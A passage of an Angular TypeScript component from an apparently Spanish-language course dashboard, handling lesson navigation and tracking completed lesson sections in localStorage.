    const currentCategory = this.lessonData.category as keyof typeof this.categoryLessons;
    const categoryLessonsList = this.categoryLessons[currentCategory];
    
    if (categoryLessonsList && this.hasPreviousLesson) {
      const previousLessonId = categoryLessonsList[this.currentStep - 2];
      this.router.navigate(['/dashboard/theory/lesson', previousLessonId]).then(() => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    } else {
      this.router.navigate(['/dashboard/theory/syllabus']).then(() => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    }
  }

  navigateToNext(): void {
    const currentCategory = this.lessonData.category as keyof typeof this.categoryLessons;
    const categoryLessonsList = this.categoryLessons[currentCategory];

    if (categoryLessonsList && this.hasNextLesson) {
      const nextLessonId = categoryLessonsList[this.currentStep];
      this.router.navigate(['/dashboard/theory/lesson', nextLessonId]).then(() => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    } else {
      this.router.navigate(['/dashboard/theory/syllabus']).then(() => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    }
  }

  navigateToSyllabus(): void {
    this.router.navigate(['/dashboard/theory/syllabus']);
  }

  reloadCurrentLesson(): void {
    // Navigate back to the syllabus page
    this.router.navigate(['/dashboard/theory/syllabus']).then(() => {
      window.scrollTo({ top: 0, behavior: 'smooth' });
    });
  }

  getStepsArray(): number[] {
    return Array.from({ length: this.totalSteps }, (_, i) => i + 1);
  }

  /**
   * Initialize section completion tracking by finding all section buttons in the lesson content
   */
  private initializeSectionTracking(lessonId: string): void {
    // Find all buttons in the lesson content that contain "Marcar este paso como completado"
    const lessonContent = document.querySelector('.lesson-content');
    if (!lessonContent) return;

    // Look for buttons, labels, or clickable elements with the completion text
    this.sectionButtons = lessonContent.querySelectorAll('button, label, [data-step], input[type="checkbox"]');
    
    // Filter to only buttons that are section completion buttons
    const completionButtons: Element[] = [];
    this.sectionButtons.forEach((element) => {
      const text = element.textContent?.toLowerCase() || '';
      if (text.includes('marcar') && text.includes('paso') && text.includes('completado')) {
        completionButtons.push(element);
      }
    });

    this.totalSections = completionButtons.length;
    console.log(`Found ${this.totalSections} section completion buttons in lesson ${lessonId}`);

    // Load previously completed sections from localStorage
    this.loadCompletedSections(lessonId);

    // Add click event listeners to each button
    completionButtons.forEach((button, index) => {
      button.addEventListener('click', (event) => {
        event.preventDefault();
        this.markSectionAsComplete(index, lessonId);
      });

      // Visual update for already completed sections
      if (this.completedSections.has(index)) {
        this.updateSectionButtonState(button, true);
      }
    });
  }

  /**
   * Mark a section as complete
   */
  private markSectionAsComplete(sectionIndex: number, lessonId: string): void {
    if (this.completedSections.has(sectionIndex)) {
      return; // Already completed
    }

    // Add to completed sections
    this.completedSections.add(sectionIndex);

    // Save to localStorage
    this.saveCompletedSections(lessonId);

    // Update button visual state
    const buttons = document.querySelectorAll('.lesson-content button, .lesson-content label');
    let currentIndex = 0;
    buttons.forEach((button) => {
      const text = button.textContent?.toLowerCase() || '';
      if (text.includes('marcar') && text.includes('paso') && text.includes('completado')) {
        if (currentIndex === sectionIndex) {
          this.updateSectionButtonState(button, true);
        }
        currentIndex++;
      }
    });

    console.log(`Section ${sectionIndex + 1}/${this.totalSections} completed`);

    // Check if all sections are now completed
    if (this.completedSections.size === this.totalSections && this.totalSections > 0 && !this.isLessonCompleted) {
      console.log('All sections completed! You can now mark the lesson as complete.');
      alert('¡Felicidades! Has completado todos los pasos de esta lección. Ahora puedes marcar la lección como completada.');
    }
  }

  /**
   * Update visual state of a section button
   */
  private updateSectionButtonState(button: Element, completed: boolean): void {
    if (completed) {
      button.classList.add('section-completed');
      button.setAttribute('disabled', 'true');
      if (button.textContent) {
        button.textContent = '✓ Paso completado';
      }
      (button as HTMLElement).style.backgroundColor = '#10b981';
      (button as HTMLElement).style.color = 'white';
      (button as HTMLElement).style.cursor = 'not-allowed';
    }
  }

  /**
   * Load completed sections from localStorage
   */
  private loadCompletedSections(lessonId: string): void {
    const storageKey = `completedSections-${lessonId}`;
    const stored = localStorage.getItem(storageKey);
    
    if (stored) {
      try {
        const sectionsArray = JSON.parse(stored);
        this.completedSections = new Set(sectionsArray);
        console.log(`Loaded ${this.completedSections.size} completed sections from localStorage`);
      } catch (e) {
        this.completedSections = new Set();
      }
    } else {
      this.completedSections = new Set();
    }
  }

  /**
   * Save completed sections to localStorage
   */
  private saveCompletedSections(lessonId: string): void {
    const storageKey = `completedSections-${lessonId}`;
    const sectionsArray = Array.from(this.completedSections);
    localStorage.setItem(storageKey, JSON.stringify(sectionsArray));
  }

}
